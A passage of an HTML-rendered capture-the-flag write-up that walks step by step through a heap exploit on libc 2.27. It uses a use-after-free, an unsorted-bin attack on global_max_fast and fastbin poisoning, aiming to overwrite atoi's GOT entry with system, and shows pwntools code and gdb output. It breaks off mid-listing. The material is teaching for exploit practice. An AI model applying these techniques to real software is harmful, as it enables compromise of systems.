+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create</span>(r, size):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;size:</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, <span style="color:#366">str</span>(size)<span style="color:#555">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit</span>(r, idx, payload):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;slot:&#39;</span>, <span style="color:#366">str</span>(idx)<span style="color:#555">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;robot:&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free</span>(r, idx):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;slot:&#39;</span>, <span style="color:#366">str</span>(idx)<span style="color:#555">.</span>encode())
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After that, let&rsquo;s prepare some offset that we will use later during doing GOT overwriting.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Due to no leak, we bruteforce 12 bit of the heap offset and 12 bit of the libc base</span>
+</span></span><span style="display:flex;"><span>heap_offset <span style="color:#555">=</span> <span style="color:#f60">0x5000</span> <span style="color:#09f;font-style:italic"># You can change this with any value you want</span>
+</span></span><span style="display:flex;"><span>global_max_fast <span style="color:#555">=</span> <span style="color:#f60">0xd940</span> <span style="color:#09f;font-style:italic"># This is the only offset that will work</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#555">=</span> <span style="color:#f60">0xf420</span> <span style="color:#09f;font-style:italic"># This is the only offset that will work</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remember that we don&rsquo;t have any leaks, so brute forcing is required.</p>
+<p>In this solution, we plan to overwrite <code>atoi</code> GOT address with <code>system</code> offset. The assumption is that this solution will work only and only if:</p>
+<ul>
+<li>The libc base address two least significant bytes is <code>0x0000</code>. For example <code>0x007ffff79e0000</code> will work.</li>
+</ul>
+<p>Only if the base address fulfills those criteria that our solution will be able to work. Why? Because on libc 2.27:</p>
+<ul>
+<li>The Offset of <code>atoi</code> is <code>0x40670</code></li>
+<li>The Offset of <code>system</code> is <code>0x4f420</code>
+<ul>
+<li>If the libc base address two least significant bytes starting with 0x0000, then we can partially overwrite two bytes of the GOT entry of <code>atoi</code>.</li>
+<li>For example, if the base starts with <code>0x1000</code>, that means the <code>atoi</code> address will be <code>0x41670</code>, and <code>system</code> is <code>0x50420</code>. Notice that if we overwrite two bytes of the <code>atoi</code> with <code>0x0420</code>, it will become <code>0x40420</code>, and it isn&rsquo;t the correct address for <code>system</code></li>
+</ul>
+</li>
+</ul>
+<p>Now we have found the correct offset, let&rsquo;s move to the heap exploitation.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Fill tcache[0x110] until it got full</span>
+</span></span><span style="display:flex;"><span>tcache_size <span style="color:#555">=</span> <span style="color:#f60">0x108</span>
+</span></span><span style="display:flex;"><span>offset_increment <span style="color:#555">=</span> <span style="color:#f60">0x260</span> <span style="color:#09f;font-style:italic"># Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>): <span style="color:#09f;font-style:italic"># We can do this because calloc doesn&#39;t use tcache</span>
+</span></span><span style="display:flex;"><span>    create(r, tcache_size)
+</span></span><span style="display:flex;"><span>    free(r, <span style="color:#f60">0</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Fulfill tcache...&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Our target is to fulfill the tcache[0x110] bin. Because calloc doesn&rsquo;t use tcache, we can simply repeatedly <code>create</code> and <code>free</code> to fulfill the tcache.</p>
+<p>Let&rsquo;s check on gdb</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  heap bins tcache
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>Tcachebins[idx=15, size=0x110, count=7] ←  Chunk(addr=0x4058c0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x4057b0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x4056a0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x405590, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x405480, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x405370, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x405260, size=0x110, flags=PREV_INUSE) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And yup, tcache is full now. Let&rsquo;s move to the next step, which is trying to overwrite <code>global_max_fast</code> value.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create two chunk with size 0x108</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># These will be used later</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">2</span>):
+</span></span><span style="display:flex;"><span>    create(r, tcache_size)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create huge chunk</span>
+</span></span><span style="display:flex;"><span>max_size <span style="color:#555">=</span> <span style="color:#f60">0x2700</span>
+</span></span><span style="display:flex;"><span>create(r, max_size)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create small chunk, so that when we free huge chunk, it won&#39;t get consolidated</span>
+</span></span><span style="display:flex;"><span>create(r, <span style="color:#f60">0x111</span>) <span style="color:#09f;font-style:italic"># This will be used as fake chunk later. We need to set the size to 0x111</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free(r, <span style="color:#f60">2</span>) <span style="color:#09f;font-style:italic"># Go to unsorted bin</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Now we have unsorted bin chunk&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, what we do:</p>
+<ul>
+<li>Create 2 small chunks with size <code>0x108</code>, so that later when we freed this, it will go to <code>fastbin</code> when we have overwritten the <code>global_max_fast</code>.</li>
+<li>Create a huge chunk with size <code>0x2700</code>. Later, when we free this, it will go to unsortedbin.</li>
+<li>Create two more small chunks just below the huge chunk with size specifically <code>0x111</code> for 2 reasons:
+<ul>
+<li>So that when we free the huge chunk, it won&rsquo;t be consolidated.</li>
+<li>So that the last entry of <code>robot_memory_size</code> will store value <code>0x111</code>. This will be important later when we want to create the arbitrary write primitive.</li>
+</ul>
+</li>
+</ul>
+<p>Let&rsquo;s check in gdb:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  heap bins unsorted
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────── Unsorted Bin for arena at 0x7ffff7dcdc40 ────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>[+] unsorted_bins[0]: fw=0x405be0, bk=0x405be0
+</span></span><span style="display:flex;"><span> →   Chunk(addr=0x405bf0, size=0x2710, flags=PREV_INUSE)
+</span></span><span style="display:flex;"><span>[+] Found 1 chunks in unsorted bin.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, we can start our unsorted bin attack via UAF.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># With UAF, modify the unsorted bin chunk bk to the global_max_fast-0x10</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(global_max_fast<span style="color:#555">-</span><span style="color:#f60">0x10</span>)[:<span style="color:#f60">2</span>]
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">2</span>, payload)
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">&#34;Now bk point to global_max_fast&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With UAF, overwrite the stored pointer in the unsorted bin chunk to <code>global_max_fast-0x10</code>. As you can see in the below gdb result, the stored pointer is now changed.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>BEFORE
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x405bf0-0x10
+</span></span><span style="display:flex;"><span>0x405be0:	0x0000000000000000	0x0000000000002711
+</span></span><span style="display:flex;"><span>0x405bf0:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AFTER
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x405bf0-0x10
+</span></span><span style="display:flex;"><span>0x405be0:	0x0000000000000000	0x0000000000002711
+</span></span><span style="display:flex;"><span>0x405bf0:	0x0000000000000000	0x00007ffff7dcf930
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x00007ffff7dcf930
+</span></span><span style="display:flex;"><span>0x7ffff7dcf930 &lt;dumped_main_arena_end&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notes that:</p>
+<ul>
+<li>This requires bruteforce, where this overwriting process will work only if the last two bytes of the libc base are all 0 (0x0000).</li>
+<li>For the sake of simplicity, during writing this writeup, I simply change the previously defined <code>global_max_fast</code> offset to the correct offset in my local, which is <code>0xf940</code>.</li>
+</ul>
+<p>Now, let&rsquo;s allocate the same chunk, and you will notice that the <code>global_max_fast</code> value will be overwritten with a huge value (which is an address of libc).</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>BEFORE
+</span></span><span style="display:flex;"><span>0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AFTER
+</span></span><span style="display:flex;"><span>0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x00007ffff7dcdca0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, after this, when we freed any chunk, it will go to <code>fastbin</code> due to the huge value stored in the <code>global_max_fast</code>. Let&rsquo;s free 2 chunks that we have created before.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Now, when we free our previous three chunks, it will go to fastbin
+</span></span><span style="display:flex;"><span>free(r,1)
+</span></span><span style="display:flex;"><span>free(r,0)
+</span></span><span style="display:flex;"><span>log.info(&#34;Now, we have fastbin chunk with size 0x110&#34;)
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check on gdb, after the above execution, we successfully cache the robots[0] and robots[1] chunks to fastbin[0x110].</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Below is our fastbin[0x110] linked list
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x00000000004059d0-0x10
+</span></span><span style="display:flex;"><span>0x4059c0:	0x0000000000000000	0x0000000000000111
+</span></span><span style="display:flex;"><span>0x4059d0:	0x0000000000405ad0	0x0000000000000000
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x0000000000405ae0-0x10
+</span></span><span style="display:flex;"><span>0x405ad0:	0x0000000000000000	0x0000000000000111
+</span></span><span style="display:flex;"><span>0x405ae0:	0x00007ffff7dcdcb0	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, with UAF, we want to overwrite the <code>atoi</code> GOT entry to <code>system</code>. First, let&rsquo;s corrupt our fastbin chunk, to point to the robot_memory_size_offset[3], which mean the fake chunk metadata size is robot_memory_size_offset[4].</p>
+<p>Fastbin is pretty strict, where we need to forge the next pointer to point to the same size fastbin chunk. This is the reason why we set robots[4] size to <code>0x111</code>, so that our fake chunk (which points to robot_memory_size_offset[3]) will have size metadata <code>0x111</code> (just like the value stored in robot_memory_size_offset[4]). Because of this, our exploit to change the fastbin linked list will be working well.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
